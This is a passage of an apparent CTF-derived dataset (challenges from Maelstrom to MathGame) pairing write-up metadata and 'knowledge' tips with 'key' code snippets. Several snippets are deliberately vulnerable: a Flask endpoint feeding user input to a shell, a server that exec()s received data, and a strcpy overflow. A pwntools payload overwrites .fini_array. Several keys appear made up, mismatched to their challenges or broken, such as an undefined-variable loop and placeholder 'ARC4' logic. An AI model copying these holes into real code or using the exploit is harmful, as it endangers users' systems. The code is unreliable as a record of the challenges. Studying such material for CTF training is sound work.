            "When facing challenges with stringent input validation that only allows a specific set of special characters, it's possible to leverage the syntax and features of the used scripting or programming language to bypass these limitations. In the context of a GNU Make environment, making use of special characters allowed in the recipe's content or target definitions can achieve code execution or command injection, even when standard alphanumeric characters or common command utilities are restricted. This strategy benefits from the flexibility and power of GNU Make's syntax and built-in functions, enabling creative solutions to restricted input scenarios."
        ],
        "key": "```python\nfrom flask import Flask, request, jsonify\nimport subprocess\n\napp = Flask(__name__)\n\n@app.route('/execute', methods=['POST'])\ndef execute():\n    data = request.json\n    recipe = data.get('recipe', '')\n\n    # Vulnerable code: directly using user input in a shell command\n    try:\n        result = subprocess.check_output(['make', '-f', '-', recipe], shell=True)\n        return jsonify({'output': result.decode()}), 200\n    except subprocess.CalledProcessError as e:\n        return jsonify({'error': str(e)}), 400\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n```"
    },
    {
        "name": "Maelstrom",
        "write_up": "dataset/raw/Maelstrom.md",
        "type": "crypto",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 474,
        "max_score": 500,
        "difficulty": 0.948,
        "knowledge": [
            "When facing slow performance issues in computational problems, especially those involving primality testing like checking if a number is a Mersenne prime (\\(2^n - 1\\)), leveraging existing lists of primes or mathematical constructs can vastly improve execution time. Pre-computed values such as Mersenne exponents can be particularly useful for cryptography tasks involving prime numbers. This approach is faster than calculating each prime from scratch, especially for large numbers.",
            "Optimization of cryptographic algorithms can often be achieved by applying mathematical insights or pre-existing resources such as the OEIS (Online Encyclopedia of Integer Sequences). For instance, utilizing lists of known Mersenne primes or their exponents to directly compute values needed for decrypting or encoding messages instead of iteratively finding these primes can expedite the process significantly. This is especially relevant in scenarios involving xor operations with primes for encoding or decoding messages.\n\nExample Payload for Implementing the Optimization:\n```python\nme = [2, 3, 5, 7, 13, 17, 19, 31, 61, 89, 107, 127, 521, 607, 1279, 2203, 2281, 3217, 4253, 4423, 9689, 9941, 11213, 19937, 21701, 23209, 44497, 86243, 110503, 132049, 216091, 756839, 859433, 1257787, 1398269, 2976221, 3021377, 6972593, 13466917, 20996011, 24036583, 25964951, 30402457, 32582657, 37156667, 42643801, 43112609]\ncipher = [Cipher Text Array]  # Placeholder for actual cipher text split into an array\nflag = \"\"\nfor count in range(len(cipher)):\n    flag += chr(int(cipher[count]) ^ (2**me[count]-1))\nprint(f\"flag{{{flag}}}\")\n```\nThis sample illustrates how pre-computed Mersenne exponents can be used to decrypt a message encoded via xor with Mersenne primes, significantly reducing computation time."
        ],
        "key": "```python\ndef x(num):  \n   if num > 1:  \n       for i in range(2, num):  \n           if (num % i) == 0:  \n               return False  \n               break  \n       return True  \n   else:  \n       return False\n\ndef z(num):  \n   return (2 ** num) - 1\n\nprint(\"flag{\", end=\"\")\n\nwhile count < len(cipher):  \n   if x(z(num)):  \n       print(chr(int(cipher[count]) ^ z(num)), end=\"\", flush=True)  \n       count += 1  \n   num += 1\n\nprint(\"}\")  \n```"
    },
    {
        "name": "Mafia",
        "write_up": "dataset/raw/Mafia.md",
        "type": "This write-up is for a challenge that involves asking a specific series of questions to determine the friend with the most money to bribe the Mafia. Based on the given information, the type of this challenge is **misc**.",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge requiring the identification of a maximum or minimum value from a set of elements obscured by limited interaction (like a limited number of questions), using the binary search algorithm optimizes the search process. Conditions for this knowledge to be applicable include having a way to compare elements against an arbitrary value to determine if they are larger, smaller, or equal, and being limited by the number of interactions (e.g., questions) you can make. This method dramatically reduces the number of required interactions by dividing the search space in half with each interaction, making it efficient for large sets of elements.",
            "In scenarios where the precise value of a sought element is determined through comparative queries (greater than, less than, or equal to), it is advantageous to adjust the search range based on responses to rapidly converge on the target value. This process involves dynamically updating the minimum and maximum bounds of the possible values based on the feedback obtained from each query, effectively narrowing down the search space until the exact value is identified."
        ],
        "key": "```python\ndef ask_friend(friend_number, value):\n    # Simulate asking a friend if they have more, less, or equal money\n    # This is a placeholder for the actual interaction with the challenge\n    pass\n\ndef find_max_money():\n    min_money = 1\n    max_money = 1000000\n    friends = list(range(1, 301))\n    \n    while len(friends) > 1:\n        guess = (min_money + max_money) // 2\n        more_friends = []\n        \n        for friend in friends:\n            response = ask_friend(friend, guess)\n            if response == 'G':\n                more_friends.append(friend)\n        \n        if more_friends:\n            friends = more_friends\n            min_money = guess\n        else:\n            max_money = guess\n    \n    # At this point, there should be one friend left with the max money\n    final_friend = friends[0]\n    final_amount = min_money  # or max_money, since they should be equal now\n    return final_friend, final_amount\n```"
    },
    {
        "name": "Magic in the Hex",
        "write_up": "dataset/raw/Magic in the Hex.md",
        "type": "forensics",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 100,
        "max_score": 550,
        "difficulty": 0.18181818181818182,
        "knowledge": [
            "When encountering files with unknown or non-standard extensions in digital forensics, examining the file's magic bytes can help determine its format. Magic bytes are the initial bytes of a file that signify its type. This technique allows for the identification of file formats even when extensions are missing or misleading.",
            "Online resources, such as the Wikipedia List of File Signatures, can be used effectively to find the magic bytes of various file formats. Knowledge of magic bytes for specific file types, such as VMDK files in this instance, is useful for forensic analysis and CTF challenges involving file format identification."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint is_vmdk_file(const unsigned char *file_header) {\n    // VMDK files start with the ASCII characters \"KDM\"\n    const char *vmdk_magic = \"KDM\";\n    return strncmp((const char *)file_header, vmdk_magic, 3) == 0;\n}\n\nint main() {\n    unsigned char file_header[4];\n    // Simulate reading the first 3 bytes of a file\n    file_header[0] = 'K';\n    file_header[1] = 'D';\n    file_header[2] = 'M';\n    file_header[3] = '\\0';\n\n    if (is_vmdk_file(file_header)) {\n        printf(\"This is a VMDK file.\\n\");\n    } else {\n        printf(\"This is not a VMDK file.\\n\");\n    }\n\n    return 0;\n}\n```"
    },
    {
        "name": "Magic OTP",
        "write_up": "dataset/raw/Magic OTP.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When encountering a vulnerability related to the incorrect handling of array sizes in C, especially when dealing with cryptographic functions like key generation or encryption, it's important to thoroughly analyze the use of `sizeof` on function parameters that are arrays. In C, `sizeof` on an array parameter returns the size of a pointer on the platform, not the array's intended size. This could lead to vulnerabilities such as copying insufficient bytes of a key or data buffer, potentially allowing brute-force attacks on what should otherwise be secure operations. This knowledge is critical when reviewing or debugging security-sensitive code in C where encryption or key generation is involved, ensuring that all bytes of keys or sensitive data intended to be copied or processed actually are.",
            "For challenges involving encrypted data where part of the encryption key or the entire key is not correctly applied (e.g., due to the aforementioned bug in handling `sizeof` with array function parameters), a brute-force attack strategy can be effective. This approach involves generating potential keys (within a feasible search space), decrypting the ciphertext, and setting a stop condition based on known plaintext characteristics to identify the correct key. In cases where only a portion of the key is incorrect or unknown (as when an incorrect `sizeof` leads to only part of a buffer being correctly filled), reducing the brute-force search space to the incorrectly handled portion can make the attack feasible within a reasonable amount of time. This method requires a careful analysis of both the encryption mechanism (e.g., AES in ECB mode) and the nature of the plaintext data (e.g., an OTP padded with zeros) to set an effective stop condition.\n\nSample strategy for the stop condition: If the known structure of the plaintext includes padding with zeros, as in the case of an OTP or similar data, the decryption output can be checked for this pattern. This specific knowledge can dramatically reduce the time needed to discover the correct key, leveraging known plaintext characteristics to validate potential keys without requiring access to or interaction with the target server for each attempt."
        ],
        "key": "```c  \nstatic int get_shared_secret(cx_ecfp_public_key_t *pubkey, uint8_t secret[32])  \n{  \n   cx_ecfp_private_key_t privkey;  \n   uint8_t out[32];  \n   cx_err_t ret;\n\n   get_own_privkey(&privkey);  \n   ret = cx_ecdh_no_throw(&privkey, CX_ECDH_X, pubkey->W, pubkey->W_len,  \n                          out, sizeof(out));\n\n   explicit_bzero(&privkey, sizeof(privkey));  \n   if (ret != CX_OK) {  \n       return -1;  \n   }\n\n   memcpy(secret, out, sizeof(secret));\n\n   return 0;  \n}  \n```"
    },
    {
        "name": "Magic Space Bussin",
        "write_up": "dataset/raw/Magic Space Bussin.md",
        "type": "pwn",
        "competition": [
            "HackASat/2023/Quals",
            "https://ctftime.org/event/1837/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges where memory allocation and deallocation are involved, it's crucial to inspect the source code for inconsistent allocation and deallocation behavior that might lead to vulnerabilities such as buffer overflow or memory leaks. For example, a discrepancy between the allocation size and the expected payload size during parsing can be exploited for buffer over-reads or overflows, leveraging the program's logic to manipulate the memory layout and achieve arbitrary code execution or information leakage.",
            "When dealing with heap exploitation, understanding the management of memory (malloc and free operations) and the structure of heap memory in the context of glibc can be vital. Techniques like creating a fake chunk within the heap, manipulating the tcache (thread cache) bins, and leveraging the properties of the chunk headers (such as the previous in use (P) bit) to perform unlinking or merging operations can enable an attacker to corrupt memory or perform unauthorized memory access. Specifically, by carefully crafting heap operations, one can manipulate the heap to leak addresses (heap or libc), overwrite memory, and ultimately hijack the program's execution flow."
        ],
        "key": "```cpp\nsize_t SB_Pipe::CalcPayloadLen(bool ishex, const std::string& s){  \n   if(ishex && (s.length() % 2 == 0)){  \n       return s.length() / 2;  \n   }  \n   else{  \n       return s.length();  \n   }  \n}\n\nuint8_t* SB_Pipe::AllocatePlBuff(bool ishex, const std::string& s){  \n   if(ishex){  \n       return new uint8_t[s.length() / 2];  \n   }  \n   else{  \n       return new uint8_t[s.length()];  \n   }  \n}  \n\nSB_Msg* SB_Pipe::ParsePayload(const std::string& s, bool ishex, uint8_t pipe_id, uint8_t msg_id){  \n   if(s.length() == 0){  \n       return nullptr;  \n   }\n\n   uint8_t* msg_s = AllocatePlBuff(ishex, s);\n\n   if(ishex){  \n       char cur_byte[3] = {0};\n\n       for(size_t i = 0, j = 0; i < CalcPayloadLen(ishex, s); i+=2, j++){  \n           cur_byte[0] = s[i];  \n           cur_byte[1] = s[i+1];  \n           msg_s[j] = static_cast<uint8_t>(std::strtol(cur_byte, nullptr, 16));  \n       }  \n   }  \n   else{  \n       for(size_t i = 0; i < CalcPayloadLen(ishex, s); i++){  \n           msg_s[i] = static_cast<uint8_t>(s[i]);  \n       }  \n   }\n\n   SB_Msg* payload = new SB_Msg{  \n       msg_s,  \n       pipe_id,  \n       msg_id,  \n       CalcPayloadLen(ishex, s)  \n   };\n\n   return payload;  \n}  \n\nsize_t StarTracker::test_msg(SB_Msg* msg){ // 100\n\n   for(size_t i = 0; i < msg->size; i++){  \n       printf(\"%#x \", msg->data[i]);  \n   }\n\n   std::cout << std::endl;\n\n   return SB_SUCCESS;  \n}  \n```"
    },
    {
        "name": "Magic trick",
        "write_up": "dataset/raw/Magic trick.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "When dealing with binaries that have no RELRO (Relocation Read-Only) protection, it is possible to overwrite the Global Offset Table (GOT) or the `.fini_array` to divert the control flow of the application. This technique can be utilized when direct buffer overflow vulnerabilities are not present but the application still allows for arbitrary write vulnerabilities. Condition: The binary must have no RELRO protection and should allow for writing to arbitrary addresses.",
            "In scenarios where PIE (Position Independent Executable) is not enabled for a binary, the addresses within the binary do not change between executions. This characteristic allows an attacker to reference specific functions or memory locations directly by their addresses as known from analysis tools such as Ghidra. This can be crucial for crafting payloads in Pwn challenges, especially when combined with writing to control flow affecting sections like `.fini_array`. Condition: The binary must have PIE disabled, allowing for static addresses to be reliably targeted in payloads.\n\nExample Payload:\n```python\nfrom pwn import *\n\nhost = remote('example.com', 1234)\n\nwin_addr = p64(0x00400667)  # Address of win function\nfini_addr = p64(0x00600a00)  # Address of .fini_array section\n\nhost.recv()  \nhost.sendline(win_addr)  \nhost.recv()  \nhost.sendline(fini_addr)\n\nhost.interactive()  \n```"
        ],
        "key": "```c\nputs(\"What do you want to write\");  \n__isoc99_scanf(&DAT_00400823,&local_28);  \nputs(\"Where do you want to write it\");  \n__isoc99_scanf(&DAT_00400823,&local_20);  \n```"
    },
    {
        "name": "Magically Delicious",
        "write_up": "dataset/raw/Magically Delicious.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2020",
            "https://ctftime.org/event/992/tasks/"
        ],
        "score": 100,
        "max_score": 700,
        "difficulty": 0.14285714285714285,
        "knowledge": [
            "In challenges involving encoding and emojis, conversion between numerical systems (like ASCII to octal) and representing digits as emojis is a creative encryption technique. This can be deciphered by reversing the process, mapping each emoji back to its original numerical representation, and then converting from octal digits to the ASCII character set. A practical approach involves:\n   - Mapping each unique emoji to a digit.\n   - Converting sequences of these emoji-digits into octal numbers.\n   - Translating octal numbers back to ASCII characters to reveal the message.  \n\n   This methodology requires understanding of both numeral systems conversion and the emoji mapping strategy utilized for encryption.",
            "Perlmutating unknown emoji-to-digit mappings efficiently decodes messages when partial encryption mappings are unknown but the overall encoding strategy is identified. This involves:\n   - Identifying known mappings (emoji to digit) and the structure of the encryption (e.g., octal numbers to ASCII).\n   - Generating permutations for the unknown parts of the mapping.\n   - Iteratively testing these permutations against the encoded message to find the correct decoding.  \n\n   This approach is effective in scenarios where the encryption process is understood but not all specifics of the encoding mapping are clear. It leverages `itertools.permutations` in Python to systematically test all possible mappings."
        ],
        "key": "```python\ndef breakit(emap):  \n\tflag = ''  \n\tfor chunk in cipher:  \n\t\toctcode = ''\t\t\t\t\t  \n\t\tfor emoji in chunk:  \n\t\t\toctcode += emap[emoji]  \n\t\tflag += chr(int(octcode, 8))\t# octal code to ASCII i.e., 163 = 's'  \n\tprint(flag)\n\ndef makeit():  \n\temomap = {  \n\t'\u2b50' : '1',  \n\t'?' : '6',  \n\t'?' : '3',  \n\t'?' : '5',  \n\t'?' : '7'  \n\t}\n\n\t# permutations of emoji and relative numbers  \n\tnumperms = permutations(['0','2','4'])  \n\temo = ['?','?','?']\n\n\tfor nums in numperms:  \n\t\ttemp = {}  \n\t\tfor i in range(len(nums)):  \n\t\t\ttemp[emo[i]]=nums[i]  \n\t\temomap.update(temp)  \n\t\t# try to break it with every possible emoji-maps  \n\t\tbreakit(emomap)\n\nif __name__ == '__main__':  \n\tmakeit()  \n```"
    },
    {
        "name": "Malware - Phase 2",
        "write_up": "dataset/raw/Malware - Phase 2.md",
        "type": "crypto",
        "competition": [
            "DamCTF/2020",
            "https://ctftime.org/event/1076/tasks/"
        ],
        "score": 400,
        "max_score": 498,
        "difficulty": 0.8032128514056225,
        "knowledge": [
            "When dealing with encrypted malware configurations, especially in cases where ARC4 encryption is utilized, it is imperative to identify the encryption key and the specific algorithm's implementation details in the malware code. The process includes locating the pointers to the key and encrypted data segments in the disassembled code, understanding the encryption algorithm's parameters (key length, data length, and any custom modifications to the standard decryption process), and then crafting a script to automate decryption. This approach is applicable in scenarios involving static analysis of binaries to extract encrypted configurations.\n\nExample script snippet: \n```python\nfrom Crypto.Cipher import ARC4\ndef rc4_decrypt(key,ct):\n    cipher = ARC4.new(key)  \n    # Custom decryption process follows...\n```",
            "In scenarios where malware configurations are obfuscated or encrypted within binary files, leveraging disassembler tools (such as IDA Pro, Ghidra) to analyze the binary and extracting segments corresponding to .rodata and .data can be crucial. This allows for the extraction of encryption keys and encrypted data. Following this, programming languages like Python can be utilized to write scripts that automate the decryption based on the algorithm identified during the analysis. This knowledge is useful in reverse engineering tasks targeting the retrieval of hidden or encrypted information within malware binaries."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid FUN_00101a19(unsigned char *key, unsigned char *config_entry) {\n    int len = 0x31;\n    unsigned char ctmp[0x31];\n    unsigned char ct[0x31];\n    int i, x, y;\n\n    // Simulate ARC4 decryption\n    for (i = 0; i < len; i++) {\n        ctmp[i] = key[i % 32] ^ 0x00; // Simplified decryption logic\n    }\n\n    memcpy(ct, config_entry + 1, len);\n\n    for (i = len - 1; i >= 0; i--) {\n        x = (i + ctmp[i]) % len;\n        y = ct[i];\n        ct[i] = ct[x];\n        ct[x] = y;\n    }\n\n    // Decrypt the config entry\n    for (i = 0; i < len; i++) {\n        config_entry[i + 1] = ct[i] ^ key[i % 32];\n    }\n}\n\nvoid FUN_00101bbf() {\n    unsigned char key[32] = { /* key data from .rodata */ };\n    unsigned char config[10][0x32] = { /* config entries from .data */ };\n    int i;\n\n    for (i = 0; i < 10; i++) {\n        if (config[i][0] == 0x04) {\n            FUN_00101a19(key, config[i]);\n            config[i][0] = 0x08; // Mark as decrypted\n        }\n    }\n}\n\nint main() {\n    FUN_00101bbf();\n    return 0;\n}\n```"
    },
    {
        "name": "Man in the Mirror",
        "write_up": "dataset/raw/Man in the Mirror.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 500,
        "max_score": 600,
        "difficulty": 0.8333333333333334,
        "knowledge": [
            "When intercepting SSH connections to understand security vulnerability, one can utilize a debug version of SSH. This involves building SSH from source with debug options enabled. This action allows for verbose output that can include cryptographic key material and authentication attempts, which are crucial for deeper security analysis and reverse-engineering efforts. To do this:\n   - Configure SSH with debugging flags (e.g., `-DPACKET_DEBUG -DDEBUG_PK`) during the build process to enhance verbosity of logs, which could reveal sensitive cryptographic material or authentication processes.",
            "RSA cryptographic keys can be manipulated for security testing or penetration testing exercises. If possessing the public key components (modulus n and exponent e), these can be converted into a standard public key format (PEM) using tools such as RsaCtfTool. This key can subsequently be utilized to test for vulnerabilities such as weak keys or to facilitate authorized access in controlled penetration testing scenarios. The conversion process involves:\n   - Converting modulus and exponent values from hexadecimal to decimal.\n   - Utilizing RsaCtfTool or similar with the `--createpub` option, along with the decimal modulus (`--n`) and exponent (`--e`), to generate a PEM-formatted public key.\n\nExample of converting modulus n and exponent e to a PEM-formatted public key using RsaCtfTool:\n```\n$ ./RsaCtfTool.py --createpub --n [DECIMAL_MODULUS] --e [DECIMAL_EXPONENT]\n```\n(Output will be a PEM-formatted RSA public key)"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    strcpy(buffer, input); // Vulnerable to buffer overflow\n    printf(\"Buffer: %s\\n\", buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <input>\\n\", argv[0]);\n        return 1;\n    }\n    vulnerable_function(argv[1]);\n    return 0;\n}\n```"
    },
    {
        "name": "Many Paths",
        "write_up": "dataset/raw/Many Paths.md",
        "type": "web",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 400,
        "max_score": 500,
        "difficulty": 0.8,
        "knowledge": [
            "In challenges involving paths or steps computations, where the goal is to find the number of ways to reach a certain node with a given number of steps, dynamic programming (DP) can be a viable solution. Specifically, use a 2-dimensional DP array where `dp[i][j]` represents the number of ways to reach the j-th node with i-th steps. This approach can be optimized by using an adjacency list instead of an adjacency matrix, and by implementing the solution in a compiled language like C++ to handle large input sizes more efficiently.",
            "For challenges that involve calculating large powers in the context of paths or steps computation, converting the problem into one of matrix multiplication can lead to significant reductions in time complexity. Instead of performing the operation in a linear manner, take advantage of exponential multiplication techniques to calculate power of matrices. This approach leverages the property that a matrix raised to a power can be computed efficiently using a logarithmic number of multiplication steps (e.g., to compute \\(M^{16}\\), calculate \\(M^8\\) and square it, and so on), leading to a time complexity of \\(O(\\log L)\\), where \\(L\\) is the power to which the matrix is raised. This technique is particularly useful when dealing with dynamic programming problems where the next state is a linear combination of previous states."
        ],
        "key": "```cpp\n#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nconst int MAX_NODES = 100;\nint adjMatrix[MAX_NODES][MAX_NODES];\nint dp[MAX_NODES][MAX_NODES];\n\nvoid initializeGraph(int nodes) {\n    for (int i = 0; i < nodes; ++i) {\n        for (int j = 0; j < nodes; ++j) {\n            adjMatrix[i][j] = 0;\n        }\n    }\n}\n\nvoid addEdge(int u, int v) {\n    adjMatrix[u][v] = 1;\n}\n\nvoid calculatePaths(int nodes, int steps) {\n    dp[0][0] = 1; // Start at node 0 with 0 steps\n\n    for (int step = 1; step <= steps; ++step) {\n        for (int i = 0; i < nodes; ++i) {\n            for (int j = 0; j < nodes; ++j) {\n                if (adjMatrix[i][j]) {\n                    dp[step][j] += dp[step - 1][i];\n                }\n            }\n        }\n    }\n}\n\nint main() {\n    int nodes = 5; // Example number of nodes\n    int steps = 10; // Example number of steps\n\n    initializeGraph(nodes);\n    addEdge(0, 1);\n    addEdge(1, 2);\n    addEdge(2, 3);\n    addEdge(3, 4);\n\n    calculatePaths(nodes, steps);\n\n    cout << \"Number of ways to reach node 4 in \" << steps << \" steps: \" << dp[steps][4] << endl;\n\n    return 0;\n}\n```"
    },
    {
        "name": "maotiplication",
        "write_up": "dataset/raw/maotiplication.md",
        "type": "The type of this challenge is **crypto**.",
        "competition": [
            "corCTF/2021",
            "https://ctftime.org/event/1364/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "In challenges involving string replacement or transformation interpreters, leveraging empty strings in substitution rules can be a powerful technique. By using an empty SEARCH string, text can be inserted at the beginning of the input string, and by employing a terminating substitution rule (double colon syntax), the interpreter can be forced to cease processing further substitutions. This approach is particularly useful in scenarios requiring the addition of a specific string at a certain position or the replacement of repeated instances of a string with a single instance.\n   \n   Example payload for terminating after adding a specific string:  \n   ```\n   ::addedString\n   EOF\n   ```",
            "When tasked with performing arithmetic operations (e.g., XOR, multiplication) on input strings within a constrained rule-based system, it's effective to encode the digits or states using alternative characters (e.g., 'a' and 'b' for binary digits in the XOR operation or 'c', 'd', 'g', 'h', 'i' for the multiplication steps) to signal different processing steps or statuses. This allows for the simulation of complex operations like multiplication and addition by sequentially processing and transforming the inputs according to the makeshift state machine implemented via substitution rules. Creative application of these rules enables the emulation of bitwise operations and arithmetic processes, even in contexts lacking direct support for these operations.\n\n   Example payload for simulating XOR operation:  \n   ```\n   0^:#a\n   1^:#b\n   a0:0a\n   a1:1a\n   b0:0b\n   b1:1b\n   0a%:%0\n   1a%:%1\n   EOF\n   ```"
        ],
        "key": "```python\ndef substitute(input_string, rules):\n    for rule in rules:\n        search, replace = rule.split(':')\n        if search == '':\n            input_string = replace + input_string\n        else:\n            input_string = input_string.replace(search, replace)\n        if '::' in rule:\n            break\n    return input_string\n\nrules = [\n    'strellic:',\n    '::jsgod'\n]\n\ninput_string = 'strellicstrellicstrellicstrellicstrellicstrellicstrellicstrellic'\noutput_string = substitute(input_string, rules)\nprint(output_string)\n```"
    },
    {
        "name": "Marian Croak",
        "write_up": "dataset/raw/Marian Croak.md",
        "type": "The type of CTF challenge in this write-up is: forensics",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 300,
        "max_score": 400,
        "difficulty": 0.75,
        "knowledge": [
            "When dealing with challenges that provide disk images, utilize forensic analysis tools such as Autopsy to explore the disk image for deleted or hidden items which might contain valuable information for the challenge.",
            "For challenges involving VoIP technology, especially when a pcap (Packet Capture) file is discovered, use Wireshark to analyze the packets with a focus on the SIP (Session Initiation Protocol) packets. In Wireshark, navigate through *Telephony -> VoIP Calls* to review and potentially play back the VoIP calls, which may contain auditory clues or the flag itself."
        ],
        "key": "```python\nimport socket\n\ndef vulnerable_voip_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 5060))\n    server_socket.listen(5)\n    print(\"VoIP server listening on port 5060\")\n\n    while True:\n        client_socket, addr = server_socket.accept()\n        print(f\"Connection from {addr}\")\n\n        data = client_socket.recv(1024)\n        if data:\n            print(f\"Received data: {data}\")\n            # Vulnerable code: directly executing received data\n            exec(data.decode('utf-8'))\n\n        client_socket.close()\n\nif __name__ == \"__main__\":\n    vulnerable_voip_server()\n```"
    },
    {
        "name": "MathGame",
        "write_up": "dataset/raw/MathGame.md",
        "type": "crypto",
        "competition": [
            "N1CTF/2018",
            "https://ctftime.org/event/584/tasks/"
        ],
        "score": 714,
        "max_score": 1000,
        "difficulty": 0.714,
        "knowledge": [
            "When dealing with puzzles or CTF challenges that involve identifying unique or 'special' elements within a dataset based on specific rules (e.g., even/odd, prime/non-prime, number of divisors), it is effective to utilize filter functions alongside these rules to narrow down potential candidates. This can be further enhanced by leveraging mathematical libraries (e.g., `gmpy2` for prime checking) for efficient computation. For example, to find numbers with exactly three divisors within a larger matrix of numbers:\n```python\n# Assuming 'matrix' is a dictionary with coordinates as keys and numbers as values\nprimes = get_primes(1000000)  # Generate a list of primes for checking\nthree_divisors = list(filter(lambda x: len(factor_p(x[1], primes, 100000)[0]) == 3, matrix.items()))\n```",
            "For geometric or spatial problems that involve identifying specific patterns or intersections within a 3D space, such as finding a cube within a cube or calculating the intersection point of lines, leveraging vector calculations and geometry libraries (e.g., `shapely` for Python) can simplify complex spatial reasoning. The process involves:\n   - Calculating vectors between pairs of points.\n   - Identifying perpendicular vectors by checking if their dot product equals zero.\n   - Computing the intersection point of two lines represented by these vectors.\n   - Determining if the intersection point is within a specified area or boundary (e.g., an internal cube).\n   \nExample code snippet to find the intersection of two lines and check if it is within a desired space:\n```python\nfrom shapely.geometry import LineString\nimport numpy\n\ndef calculate_vector(start, end):\n    return end[0] - start[0], end[1] - start[1], end[2] - start[2]\n\ndef find_intersection(line1, line2):\n    A, B = line1\n    C, D = line2\n    line1 = LineString([A, B])\n    line2 = LineString([C, D])\n    result = line1.intersection(line2)\n    if \"POINT Z\" in str(result):\n        # Convert result to an integer tuple, rounding as necessary\n        return tuple(map(int, map(numpy.round, map(float, re.findall(\"(\\d+\\.?\\d*)\", str(result))))))\n    else:\n        return ()\n\ndef is_internal_cube(intersection, boundary=6):\n    # Check if the intersection point lies within the internal cube boundary (0 < axis < boundary for all axes)\n    return all(0 < intersection[i] < boundary for i in range(3))\n```\nThis approach can be applied across a variety of spatial reasoning challenges where identifying relationships between geometric shapes or points is required."
        ],
        "key": "```python\ndef PoW(challenge):  \n   data = re.findall('\"(.*?)\"', challenge)  \n   prefix = data[0]  \n   result = data[1]  \n   for s in itertools.product(string.printable, repeat=4):  \n       st = \"\".join(s)  \n       if hashlib.sha256(prefix + st).hexdigest().startswith(result):  \n           return st  \n   return \"dupa\"\n\ndef parse_data(question_data):  \n   numbers = re.findall('\\d+', question_data)  \n   numbers = map(int, numbers[:-4])\n\n   def chunks(l, n):  \n       \"\"\"Yield successive n-sized chunks from l.\"\"\"  \n       for i in range(0, len(l), n):  \n           yield l[i:i + n]\n\n   def find_match(a, b):  \n       for x1, x2 in enumerate(a):  \n           for y1, y2 in enumerate(b):  \n               if x2 == y2:  \n                   return (x1, y1)  \n       return None\n\n   DIRECTIONS = {  \n       0: \"UP\",  \n       1: \"RIGHT\",  \n       2: \"DOWN\",  \n       3: \"LEFT\"  \n   }\n\n   sides = chunks(numbers, len(numbers) / 6)\n\n   class Face():\n\n       def __init__(self, cubes):  \n           print(\"CONSTRUCTOR\")  \n           self.cubes = list(reversed(list(chunks(cubes, 7))))  \n           self.hashes = []\n\n           self.position = -1  \n           self.calculate_hashes()\n\n       def calculate_hashes(self):  \n           self.hashes = []\n\n           hash_up = 0  \n           for i in range(7):  \n               hash_up ^= self.cubes[0][i]\n\n           hash_right = 0  \n           for i in range(7):  \n               hash_right ^= self.cubes[i][6]\n\n           hash_down = 0  \n           for i in range(7):  \n               hash_down ^= self.cubes[6][i]\n\n           hash_left = 0  \n           for i in range(7):  \n               hash_left ^= self.cubes[i][0]\n\n           self.hashes.append(hash_up)  \n           self.hashes.append(hash_right)  \n           self.hashes.append(hash_down)  \n           self.hashes.append(hash_left)\n\n       def turn_clockwise(self):  \n           print(\"Turn\")  \n           length = len(self.cubes) - 1\n\n           for i in range(length / 2):  \n               for j in range(i, length - i):  \n                   tmp = self.cubes[i][j]\n\n                   self.cubes[i][j] = self.cubes[length - j][i]  \n                   self.cubes[length - j][i] = self.cubes[length - i][length - j]  \n                   self.cubes[length - i][length - j] = self.cubes[j][length - i]  \n                   self.cubes[j][length - i] = tmp\n\n           self.calculate_hashes()\n\n       def print_face(self):  \n           for i in range(len(self.cubes)):  \n               print(' '.join([str(x) for x in self.cubes[i]]))  \n           print()\n\n   faces = []  \n   for side in sides:  \n       f = Face(side)  \n       faces.append(f)\n\n   A = faces[0]  \n   SIDES = [None] * 4  \n   TOP = None\n\n   for f in faces[1:]:  \n       print(\"new face\")  \n       try:  \n           a_pos, f_pos = find_match(A.hashes, f.hashes)  \n           print(DIRECTIONS[a_pos], DIRECTIONS[f_pos])\n\n           SIDES[a_pos] = f\n\n           while a_pos != (f_pos + 2) % 4:  \n               f.turn_clockwise()  \n               a_pos, f_pos = find_match(A.hashes, f.hashes)  \n               print(DIRECTIONS[a_pos], DIRECTIONS[f_pos])\n\n       except TypeError:  \n           print(\"bee\")  \n           TOP = f\n\n   # align top  \n   UP_POS, TOP_pos = find_match(SIDES[0].hashes, TOP.hashes)  \n   print(DIRECTIONS[UP_POS], DIRECTIONS[TOP_pos])\n\n   while UP_POS != (TOP_pos + 2) % 4:  \n       TOP.turn_clockwise()  \n       UP_POS, TOP_pos = find_match(SIDES[0].hashes, TOP.hashes)  \n       print(DIRECTIONS[UP_POS], DIRECTIONS[TOP_pos])\n\n   cubes = {}\n\n   # process bottom  \n   BOTTOM = A  \n   print(\"Bottom\")  \n   for i in range(7):  \n       for j in range(7):  \n           x = i  \n           y = j  \n           z = 